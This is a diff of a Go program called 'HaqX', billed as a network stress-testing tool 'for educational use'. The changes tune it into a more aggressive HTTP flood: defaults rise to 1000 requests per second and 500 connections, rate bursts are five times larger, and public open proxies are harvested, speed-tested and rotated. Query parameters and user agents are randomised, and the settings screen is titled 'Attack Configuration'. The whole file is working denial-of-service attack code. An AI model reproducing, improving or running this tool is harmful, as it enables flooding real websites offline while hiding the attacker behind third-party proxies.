@@ -1,7 +1,7 @@
 package main
 
 /*
- HaqX - Advanced Network Stress Testing Tool
+ HaqX - Advanced Network Stress Testing Tool (Optimized)
  For Educational & Authorized Testing Only
 */
 
@@ -13,6 +13,7 @@ import (
 	"fmt"
 	"io"
 	"math/rand"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -25,16 +26,11 @@ import (
 	"time"
 )
 
-const VERSION = "3.3.7"
+const VERSION = "4.0.0"
 const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 const ACCEPT = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 type (
-	Counter struct {
-		sync.RWMutex
-		Value int64
-	}
-	
 	Metric struct {
 		sync.RWMutex
 		Total    int64
@@ -44,27 +40,29 @@ type (
 	}
 	
 	Target struct {
-		URL        string
+		URL         string
 		Connections int
-		Timeout    time.Duration
-		Rate       int
-		Data       string
-		Headers    []string
-		Agents     []string
-		Referers   []string
-		Safe       bool
-		Verbose    bool
-		Duration   int
-		Method     string
-		Proxy      bool
-		Pool       []string
-		Index      int
+		Timeout     time.Duration
+		Rate        int
+		Data        string
+		Headers     []string
+		Agents      []string
+		Referers    []string
+		Safe        bool
+		Verbose     bool
+		Duration    int
+		Method      string
+		Proxy       bool
+		Pool        []string
+		ProxyStats  map[string]int
+		Index       int
 		sync.Mutex
 	}
 	
 	ProxyHunter struct {
-		Sources []string
-		Cache   []string
+		Sources   []string
+		Cache     []string
+		Tested    map[string]bool
 		sync.Mutex
 	}
 	
@@ -76,18 +74,19 @@ type (
 	}
 	
 	Throttle struct {
-		Tickets  chan struct{}
-		Tick     time.Duration
+		Tickets   chan struct{}
+		Tick      time.Duration
 		sync.Mutex
-		Refilled time.Time
-		Done     chan struct{}
+		Refilled  time.Time
+		Done      chan struct{}
+		BurstSize int
 	}
 )
 
 var (
-	Stats   *Metric
-	Debug   bool
-	Secure  bool
+	Stats  *Metric
+	Debug  bool
+	Secure bool
 )
 
 func init() {
@@ -99,12 +98,13 @@ func init() {
 
 func NewConfig() *Target {
 	return &Target{
-		Timeout:    15 * time.Second,
-		Rate:       200,
-		Connections: 150,
-		Duration:   0,
-		Method:     "GET",
-		Proxy:      true,
+		Timeout:     5 * time.Second,      // Turunkan timeout
+		Rate:        1000,                 // Naikkan rate
+		Connections: 500,                  // Naikkan connections
+		Duration:    0,
+		Method:      "GET",
+		Proxy:       true,
+		ProxyStats:  make(map[string]int),
 		Agents: []string{
 			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
 			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
@@ -145,9 +145,28 @@ func (t *Target) NextProxy() string {
 	t.Lock()
 	defer t.Unlock()
 	if len(t.Pool) == 0 { return "" }
-	proxy := t.Pool[t.Index]
-	t.Index = (t.Index + 1) % len(t.Pool)
-	return proxy
+	
+	// Gunakan round-robin dengan skip proxy yang gagal
+	for attempts := 0; attempts < len(t.Pool); attempts++ {
+		proxy := t.Pool[t.Index]
+		t.Index = (t.Index + 1) % len(t.Pool)
+		
+		// Skip proxy yang sering gagal
+		if t.ProxyStats[proxy] < 3 {
+			return proxy
+		}
+	}
+	return t.Pool[t.Index]
+}
+
+func (t *Target) MarkProxy(proxy string, success bool) {
+	t.Lock()
+	defer t.Unlock()
+	if success {
+		t.ProxyStats[proxy] = 0
+	} else {
+		t.ProxyStats[proxy]++
+	}
 }
 
 func Hunter() *ProxyHunter {
@@ -168,6 +187,7 @@ func Hunter() *ProxyHunter {
 			"https://api.openproxylist.xyz/socks4.txt",
 			"https://api.openproxylist.xyz/socks5.txt",
 		},
+		Tested: make(map[string]bool),
 	}
 }
 
@@ -177,27 +197,45 @@ func (h *ProxyHunter) Harvest() []string {
 	
 	var all []string
 	client := &http.Client{
-		Timeout: 8 * time.Second,
+		Timeout: 5 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
 	}
 	
+	// Gunakan goroutine untuk parallel fetching
+	var wg sync.WaitGroup
+	results := make(chan []string, len(h.Sources))
+	
 	for _, src := range h.Sources {
-		resp, err := client.Get(src)
-		if err != nil { continue }
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		
-		lines := strings.Split(string(body), "\n")
-		for _, line := range lines {
-			line = strings.TrimSpace(line)
-			if line == "" || strings.HasPrefix(line, "#") { continue }
-			if strings.Contains(line, ":") {
-				all = append(all, line)
+		wg.Add(1)
+		go func(source string) {
+			defer wg.Done()
+			resp, err := client.Get(source)
+			if err != nil { return }
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			
+			var proxies []string
+			lines := strings.Split(string(body), "\n")
+			for _, line := range lines {
+				line = strings.TrimSpace(line)
+				if line == "" || strings.HasPrefix(line, "#") { continue }
+				if strings.Contains(line, ":") {
+					proxies = append(proxies, line)
+				}
 			}
-		}
-		time.Sleep(300 * time.Millisecond)
+			results <- proxies
+		}(src)
+	}
+	
+	go func() {
+		wg.Wait()
+		close(results)
+	}()
+	
+	for proxies := range results {
+		all = append(all, proxies...)
 	}
 	
 	// Deduplicate
@@ -209,7 +247,60 @@ func (h *ProxyHunter) Harvest() []string {
 			unique = append(unique, p)
 		}
 	}
-	return unique
+	
+	// Filter proxy - test kecepatan
+	fmt.Printf("🔍 Testing %d proxies...\n", len(unique))
+	var fastProxies []string
+	var mu sync.Mutex
+	var wgFilter sync.WaitGroup
+	
+	// Test proxy dengan parallel
+	sem := make(chan struct{}, 50) // Max 50 concurrent tests
+	for _, proxy := range unique {
+		wgFilter.Add(1)
+		go func(p string) {
+			defer wgFilter.Done()
+			sem <- struct{}{}
+			defer func() { <-sem }()
+			
+			if h.TestProxy(p) {
+				mu.Lock()
+				fastProxies = append(fastProxies, p)
+				mu.Unlock()
+			}
+		}(proxy)
+	}
+	wgFilter.Wait()
+	
+	fmt.Printf("✅ Found %d fast proxies\n", len(fastProxies))
+	return fastProxies
+}
+
+func (h *ProxyHunter) TestProxy(proxy string) bool {
+	// Test dengan timeout singkat
+	client := &http.Client{
+		Timeout: 2 * time.Second,
+		Transport: &http.Transport{
+			Proxy: func(req *http.Request) (*url.URL, error) {
+				return url.Parse("http://" + proxy)
+			},
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			DialContext: (&net.Dialer{
+				Timeout:   1 * time.Second,
+				KeepAlive: 30 * time.Second,
+			}).DialContext,
+		},
+	}
+	
+	// Test dengan request kecil
+	resp, err := client.Get("http://httpbin.org/ip")
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+	
+	// Hanya terima response cepat
+	return resp.StatusCode == 200
 }
 
 func BuildFactory(size int, timeout time.Duration, cfg *Target) *Factory {
@@ -225,26 +316,33 @@ func BuildFactory(size int, timeout time.Duration, cfg *Target) *Factory {
 
 func (f *Factory) NewClient() *http.Client {
 	tr := &http.Transport{
-		MaxIdleConns:        200,
-		MaxIdleConnsPerHost: 30,
-		MaxConnsPerHost:     30,
-		IdleConnTimeout:     120 * time.Second,
+		MaxIdleConns:        500,
+		MaxIdleConnsPerHost: 50,
+		MaxConnsPerHost:     50,
+		IdleConnTimeout:     30 * time.Second,
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
 		DisableKeepAlives:   false,
 		DisableCompression:  false,
 		ForceAttemptHTTP2:   true,
+		DialContext: (&net.Dialer{
+			Timeout:   2 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
 	}
 	
 	if f.Cfg.Proxy && len(f.Cfg.Pool) > 0 {
 		proxy := f.Cfg.NextProxy()
 		if proxy != "" {
-			if p, err := url.Parse(proxy); err == nil {
+			if p, err := url.Parse("http://" + proxy); err == nil {
 				tr.Proxy = http.ProxyURL(p)
 			}
 		}
 	}
 	
-	return &http.Client{Timeout: f.Cfg.Timeout, Transport: tr}
+	return &http.Client{
+		Timeout:   f.Cfg.Timeout,
+		Transport: tr,
+	}
 }
 
 func (f *Factory) Acquire() *http.Client {
@@ -273,14 +371,17 @@ func (f *Factory) Release() {
 func NewThrottle(rate int) *Throttle {
 	if rate <= 0 { return nil }
 	
+	burstSize := rate * 5 // Burst 5x lebih agresif
 	t := &Throttle{
-		Tickets:  make(chan struct{}, rate*3),
-		Tick:     time.Second / time.Duration(rate),
-		Done:     make(chan struct{}),
-		Refilled: time.Now(),
+		Tickets:   make(chan struct{}, burstSize),
+		Tick:      time.Second / time.Duration(rate),
+		Done:      make(chan struct{}),
+		Refilled:  time.Now(),
+		BurstSize: burstSize,
 	}
 	
-	for i := 0; i < rate*3; i++ {
+	// Isi penuh dengan burst
+	for i := 0; i < burstSize; i++ {
 		select {
 		case t.Tickets <- struct{}{}:
 		default:
@@ -303,9 +404,13 @@ func (t *Throttle) Pump() {
 			t.Lock()
 			now := time.Now()
 			if now.Sub(t.Refilled) >= t.Tick {
-				select {
-				case t.Tickets <- struct{}{}:
-				default:
+				// Tambah token lebih agresif
+				for i := 0; i < 5; i++ {
+					select {
+					case t.Tickets <- struct{}{}:
+					default:
+						break
+					}
 				}
 				t.Refilled = now
 			}
@@ -333,15 +438,15 @@ func main() {
 	cfg := NewConfig()
 	
 	var (
-		showVer   bool
-		agents    string
-		custom    arrayFlags
-		conns     int
-		to        int
-		rate      int
-		dur       int
-		method    string
-		noprox    bool
+		showVer bool
+		agents  string
+		custom  arrayFlags
+		conns   int
+		to      int
+		rate    int
+		dur     int
+		method  string
+		noprox  bool
 	)
 
 	flag.BoolVar(&showVer, "v", false, "Show version")
@@ -350,9 +455,9 @@ func main() {
 	flag.BoolVar(&noprox, "noprox", false, "Disable proxies")
 	flag.StringVar(&agents, "agents", "", "User-agent file")
 	flag.StringVar(&cfg.Data, "data", "", "POST data")
-	flag.IntVar(&conns, "c", 0, "Connections")
-	flag.IntVar(&to, "t", 0, "Timeout seconds")
-	flag.IntVar(&rate, "r", 0, "Rate limit")
+	flag.IntVar(&conns, "c", 0, "Connections (default: 500)")
+	flag.IntVar(&to, "t", 0, "Timeout seconds (default: 5)")
+	flag.IntVar(&rate, "r", 0, "Rate limit (default: 1000)")
 	flag.IntVar(&dur, "d", 0, "Duration seconds")
 	flag.StringVar(&method, "m", "", "HTTP method")
 	flag.Var(&custom, "H", "Custom headers")
@@ -396,12 +501,12 @@ func main() {
 	fmt.Printf("✅ Target: %s\n", cfg.URL)
 
 	if cfg.Proxy {
-		fmt.Println("\n🌐 Harvesting proxies...")
+		fmt.Println("\n🌐 Harvesting & filtering proxies...")
 		hunter := Hunter()
 		proxies := hunter.Harvest()
 		if len(proxies) > 0 {
 			cfg.Pool = proxies
-			fmt.Printf("✅ %d proxies ready\n", len(proxies))
+			fmt.Printf("✅ %d fast proxies ready\n", len(proxies))
 		} else {
 			fmt.Println("⚠️  No proxies found, continuing without")
 			cfg.Proxy = false
@@ -527,7 +632,7 @@ func main() {
 		cancel()
 	}()
 
-	factory := BuildFactory(20, cfg.Timeout, cfg)
+	factory := BuildFactory(50, cfg.Timeout, cfg) // Naikkan pool size
 	defer factory.Release()
 
 	var throttle *Throttle
@@ -566,7 +671,7 @@ func RandomString(n int, rng *rand.Rand) string {
 }
 
 func RandomParams(rng *rand.Rand) string {
-	n := 2 + rng.Intn(8)
+	n := 3 + rng.Intn(10) // Lebih banyak parameter
 	var parts []string
 	for i := 0; i < n; i++ {
 		k := RandomString(3+rng.Intn(10), rng)
@@ -617,7 +722,7 @@ func Launch(ctx context.Context, cancel context.CancelFunc, cfg *Target, parsed 
 
 	monitor := make(chan struct{})
 	go func() {
-		ticker := time.NewTicker(2 * time.Second)
+		ticker := time.NewTicker(1 * time.Second) // Update lebih sering
 		defer ticker.Stop()
 		for {
 			select {
@@ -664,26 +769,28 @@ func Worker(ctx context.Context, id int, cfg *Target, parsed *url.URL, factory *
 			}
 			
 			client := factory.Acquire()
-			if err := Fire(ctx, client, cfg, parsed, host, rng); err != nil {
+			success := Fire(ctx, client, cfg, parsed, host, rng)
+			
+			if success {
+				atomic.AddInt64(&Stats.Total, 1)
+			} else {
 				if Debug {
-					fmt.Printf("\n🔴 Worker %d: %v\n", id, err)
+					fmt.Printf("\n🔴 Worker %d: failed\n", id)
 				}
 				atomic.AddInt64(&Stats.Errors, 1)
-			} else {
-				atomic.AddInt64(&Stats.Total, 1)
 			}
 		}
 	}
 }
 
-func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL, host string, rng *rand.Rand) error {
+func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL, host string, rng *rand.Rand) bool {
 	var req *http.Request
 	var err error
 	
-	for attempt := 0; attempt < cfg.Connections/10+1; attempt++ {
+	for attempt := 0; attempt < 3; attempt++ {
 		select {
 		case <-ctx.Done():
-			return ctx.Err()
+			return false
 		default:
 			if cfg.Method == "POST" {
 				var body io.Reader
@@ -703,39 +810,52 @@ func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL
 			}
 			
 			if err != nil {
-				return err
+				return false
 			}
 			
 			Arm(req, cfg, host, rng)
 			
+			start := time.Now()
 			resp, err := client.Do(req)
 			if err != nil {
-				if attempt < 3 {
-					time.Sleep(time.Duration(100*(1<<uint(attempt))) * time.Millisecond)
+				if attempt < 2 {
+					time.Sleep(time.Duration(50*(1<<uint(attempt))) * time.Millisecond)
 					continue
 				}
-				return err
+				return false
 			}
 			defer resp.Body.Close()
 			
+			// Baca body untuk memastikan koneksi reusable
 			io.Copy(io.Discard, resp.Body)
 			
+			// Catat status code
 			Stats.Lock()
 			Stats.Codes[resp.StatusCode]++
 			Stats.Unlock()
+			
+			// Mark proxy success/fail
+			if cfg.Proxy {
+				cfg.MarkProxy(client.Transport.(*http.Transport).Proxy(nil).String(), resp.StatusCode == 200)
+			}
 			
 			if Secure && resp.StatusCode >= 500 {
 				if Debug {
 					fmt.Printf("\n⚠️  %d from server\n", resp.StatusCode)
 				}
-				return fmt.Errorf("server error %d", resp.StatusCode)
+				return false
 			}
 			
-			return nil
+			// Log slow responses
+			if time.Since(start) > 2*time.Second && Debug {
+				fmt.Printf("\n🐌 Slow response: %v\n", time.Since(start))
+			}
+			
+			return resp.StatusCode == 200
 		}
 	}
 	
-	return fmt.Errorf("exhausted retries")
+	return false
 }
 
 func Arm(req *http.Request, cfg *Target, host string, rng *rand.Rand) {
@@ -791,28 +911,28 @@ func Banner() {
 func ShowConfig(cfg *Target) {
 	fmt.Println()
 	fmt.Println("📋 Attack Configuration")
-	fmt.Printf("  🎯 Target:  %s\n", cfg.URL)
-	fmt.Printf("  🔢 Workers: %d\n", cfg.Connections)
-	fmt.Printf("  ⏱️  Timeout: %v\n", cfg.Timeout)
-	fmt.Printf("  🚀 Rate:    %d req/s\n", cfg.Rate)
-	fmt.Printf("  📡 Method:  %s\n", cfg.Method)
+	fmt.Printf("  🎯 Target:   %s\n", cfg.URL)
+	fmt.Printf("  🔢 Workers:  %d\n", cfg.Connections)
+	fmt.Printf("  ⏱️  Timeout:  %v\n", cfg.Timeout)
+	fmt.Printf("  🚀 Rate:     %d req/s\n", cfg.Rate)
+	fmt.Printf("  📡 Method:   %s\n", cfg.Method)
 	if cfg.Method == "POST" && cfg.Data != "" {
-		fmt.Printf("  📝 Data:    %s\n", cfg.Data)
+		fmt.Printf("  📝 Data:     %s\n", cfg.Data)
 	}
 	if cfg.Duration > 0 {
-		fmt.Printf("  ⏰ Time:    %d seconds\n", cfg.Duration)
+		fmt.Printf("  ⏰ Time:     %d seconds\n", cfg.Duration)
 	} else {
-		fmt.Printf("  ⏰ Time:    ♾️  Unlimited\n")
+		fmt.Printf("  ⏰ Time:     ♾️  Unlimited\n")
 	}
-	fmt.Printf("  🛡️  Safe:    %t\n", Secure)
-	fmt.Printf("  📄 Agents:  %d\n", len(cfg.Agents))
+	fmt.Printf("  🛡️  Safe:     %t\n", Secure)
+	fmt.Printf("  📄 Agents:   %d\n", len(cfg.Agents))
 	if cfg.Proxy && len(cfg.Pool) > 0 {
-		fmt.Printf("  🌐 Proxies: %d\n", len(cfg.Pool))
+		fmt.Printf("  🌐 Proxies:  %d (filtered)\n", len(cfg.Pool))
 	} else {
-		fmt.Printf("  🌐 Proxies: ❌\n")
+		fmt.Printf("  🌐 Proxies:  ❌\n")
 	}
 	if len(cfg.Headers) > 0 {
-		fmt.Printf("  📋 Headers: %d\n", len(cfg.Headers))
+		fmt.Printf("  📋 Headers:  %d\n", len(cfg.Headers))
 	}
 	fmt.Println()
 }
@@ -833,7 +953,7 @@ func ShowStats() {
 	fmt.Printf("  ✅ Success:  %d\n", Stats.Total)
 	fmt.Printf("  ❌ Errors:   %d\n", Stats.Errors)
 	fmt.Printf("  📈 Rate:     %.2f%%\n", rate)
-	fmt.Printf("  ⏱️  Duration:  %v\n", duration)
+	fmt.Printf("  ⏱️  Duration: %v\n", duration)
 	
 	if duration.Seconds() > 0 {
 		fmt.Printf("  🚀 Req/s:    %.2f\n", float64(Stats.Total)/duration.Seconds())
